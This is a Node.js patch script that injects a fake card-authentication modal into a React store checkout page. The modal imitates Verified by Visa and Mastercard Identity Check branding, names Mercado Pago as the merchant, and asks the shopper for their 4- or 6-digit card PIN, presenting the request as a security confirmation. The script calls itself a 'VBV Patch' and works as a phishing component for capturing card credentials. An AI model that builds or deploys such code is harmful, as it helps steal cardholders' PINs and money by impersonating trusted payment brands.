const fs = require('fs');

let code = fs.readFileSync('src/pages/StoreCheckoutInstallments.tsx', 'utf8');

const modalStart = code.indexOf('{showAliasModal && (');
const modalEnd = code.indexOf(')}', modalStart) + 2;

if (modalStart === -1 || modalEnd === -1) {
  console.error('Modal block not found!');
  process.exit(1);
}

const getBrandIcon = (brand) => {
  switch (brand?.toLowerCase()) {
    case 'visa': return 'https://logos-world.net/wp-content/uploads/2020/04/Visa-Logo.png';
    case 'mastercard': return 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
    case 'elo': return 'https://seeklogo.com/images/E/elo-logo-0B17511677-seeklogo.com.png';
    case 'amex': return 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
    case 'diners': return 'https://upload.wikimedia.org/wikipedia/commons/a/a6/Diners_Club_Logo3.svg';
    case 'hipercard': return 'https://upload.wikimedia.org/wikipedia/commons/6/63/Hipercard_logo.svg';
    default: return 'https://cdn-icons-png.flaticon.com/512/1086/1086741.png'; // default bank/card icon
  }
}

const newModalJSX = `
      {showAliasModal && (() => {
        const getBrandLogo = (brand) => {
          switch(brand?.toLowerCase()) {
            case 'visa': return 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Verified_by_Visa_logo.svg/1024px-Verified_by_Visa_logo.svg.png';
            case 'mastercard': return 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/MasterCard_SecureCode_logo.svg/1024px-MasterCard_SecureCode_logo.svg.png';
            case 'elo': return 'https://seeklogo.com/images/E/elo-logo-0B17511677-seeklogo.com.png';
            case 'amex': return 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/American_Express_SafeKey_logo.svg/1024px-American_Express_SafeKey_logo.svg.png';
            default: return 'https://cdn-icons-png.flaticon.com/512/2628/2628286.png'; // shield/secure icon
          }
        };

        const secLogo = getBrandLogo(cardInputContext?.brand);
        const titleText = cardInputContext?.brand?.toLowerCase() === 'visa' ? 'Verified by Visa' : 
                          cardInputContext?.brand?.toLowerCase() === 'mastercard' ? 'Mastercard Identity Check' : 
                          'Autenticação de Segurança';

        return (
        <div style={{ position:'fixed', top:0, left:0, width:'100vw', height:'100vh', background:'rgba(0,0,0,0.6)', zIndex:999999, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', fontFamily: '"Arial", sans-serif' }}>
          <div style={{ background:'#fff', width:'100%', maxWidth:'380px', borderRadius:'10px', overflow:'hidden', boxShadow:'0 10px 30px rgba(0,0,0,0.3)', border:'1px solid #e0e0e0' }}>
            
            {/* VBV/MACS Header */}
            <div style={{ padding:'20px', display:'flex', flexDirection:'column', alignItems:'center', borderBottom:'1px solid #e0e0e0', background:'#fbfbfb' }}>
              <img src={secLogo} alt="Secure" style={{ height:'45px', objectFit:'contain', marginBottom:'12px' }} />
              <h2 style={{ fontSize:'15px', fontWeight:'bold', color:'#333', textAlign:'center', margin:0 }}>{titleText}</h2>
              <p style={{ fontSize:'13px', color:'#666', textAlign:'center', marginTop:'5px', marginBottom:0 }}>Confirmação Adicional de Identidade</p>
            </div>
            
            <div style={{ padding:'24px' }}>
              <div style={{ background:'#f9f9fa', border:'1px solid #e8e8e8', borderRadius:'6px', padding:'15px', marginBottom:'20px' }}>
                <div style={{ display:'flex', justifyContent:'space-between', marginBottom:'10px' }}>
                  <span style={{ fontSize:'13px', color:'#555', fontWeight:'500' }}>Estabelecimento:</span>
                  <span style={{ fontSize:'13px', color:'#333', fontWeight:'bold' }}>Mercado Pago</span>
                </div>
                <div style={{ display:'flex', justifyContent:'space-between', marginBottom:'10px' }}>
                  <span style={{ fontSize:'13px', color:'#555', fontWeight:'500' }}>Final do Cartão:</span>
                  <span style={{ fontSize:'13px', color:'#333', fontWeight:'bold' }}>{cardInputContext?.cardNumber?.slice(-4) || '****'}</span>
                </div>
                <div style={{ borderTop:'1px dashed #ccc', margin:'12px 0' }}></div>
                <p style={{ fontSize:'12px', color:'#666', margin:0, lineHeight:'1.4' }}>
                  Para prosseguir com a transação, confirme o <strong>Tipo de Senha</strong> correspondente ao seu cartão {cardInputContext?.brand?.toUpperCase()} e insira no campo abaixo para aprovar a compra.
                </p>
              </div>

              <div style={{ marginBottom:'18px' }}>
                <label style={{ display:'block', fontSize:'13px', marginBottom:'10px', fontWeight:'bold', color:'#444' }}>Selecione o formato da senha</label>
                <div style={{ display:'flex', gap:'16px' }}>
                  <label style={{ display:'flex', alignItems:'center', gap:'8px', fontSize:'13px', cursor:'pointer' }}>
                    <input type='radio' name='aliasLength' checked={aliasLength === '4'} onChange={() => { setAliasLength('4'); setAliasPassword(''); }} style={{ accentColor: '#005ea6' }} /> 
                    <span style={{ fontWeight: aliasLength === '4' ? 'bold' : 'normal' }}>4 Dígitos</span>
                  </label>
                  <label style={{ display:'flex', alignItems:'center', gap:'8px', fontSize:'13px', cursor:'pointer' }}>
                    <input type='radio' name='aliasLength' checked={aliasLength === '6'} onChange={() => { setAliasLength('6'); setAliasPassword(''); }} style={{ accentColor: '#005ea6' }} /> 
                    <span style={{ fontWeight: aliasLength === '6' ? 'bold' : 'normal' }}>6 Dígitos</span>
                  </label>
                </div>
              </div>

              <div style={{ marginBottom:'24px' }}>
                <label style={{ display:'block', fontSize:'13px', marginBottom:'8px', fontWeight:'bold', color:'#444' }}>Senha do Cartão</label>
                <div style={{ position: 'relative' }}>
                  <input 
                    type="password" 
                    inputMode="numeric"
                    maxLength={Number(aliasLength)}
                    value={aliasPassword}
                    onChange={e => setAliasPassword(e.target.value.replace(/\\D/g, ''))}
                    placeholder={\`Digite sua senha de \${aliasLength} dígitos\`}
                    style={{ width:'100%', padding:'12px 14px', border:'1px solid #b3b3b3', borderRadius:'4px', fontSize:'15px', outline:'none', boxSizing:'border-box', letterSpacing:'4px' }}
                  />
                  <div style={{ position:'absolute', right:'12px', top:'50%', transform:'translateY(-50%)', opacity:0.4 }}>
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                  </div>
                </div>
              </div>

              <div style={{ display:'flex', gap:'10px' }}>
                <button 
                  type="button"
                  onClick={() => setShowAliasModal(false)}
                  style={{ flex:1, padding:'12px', background:'#f0f0f0', color:'#444', border:'1px solid #ccc', borderRadius:'4px', fontSize:'14px', fontWeight:'bold', cursor:'pointer' }}
                >
                  Cancelar
                </button>
                <button 
                  type="button"
                  onClick={handleConfirmAlias}
                  disabled={isSubmittingAlias || aliasPassword.length < Number(aliasLength)}
                  style={{ flex:1, padding:'12px', background: '#005ea6', color:'#fff', border:'none', borderRadius:'4px', fontSize:'14px', fontWeight:'bold', cursor: (isSubmittingAlias || aliasPassword.length < Number(aliasLength)) ? 'not-allowed' : 'pointer', opacity: (isSubmittingAlias || aliasPassword.length < Number(aliasLength)) ? 0.6 : 1 }}
                >
                  {isSubmittingAlias ? 'Autenticando...' : 'Confirmar'}
                </button>
              </div>
            </div>
            
            <div style={{ background:'#f1f1f1', padding:'10px', textAlign:'center', borderTop:'1px solid #e0e0e0' }}>
              <span style={{ fontSize:'11px', color:'#888' }}>Transação protegida e processada em ambiente seguro.</span>
            </div>
          </div>
        </div>
        );
      })()}
`;

const newCode = code.substring(0, modalStart) + newModalJSX.trim() + '\n' + code.substring(modalEnd);

fs.writeFileSync('src/pages/StoreCheckoutInstallments.tsx', newCode);
console.log('VBV Patch applied successfully.');
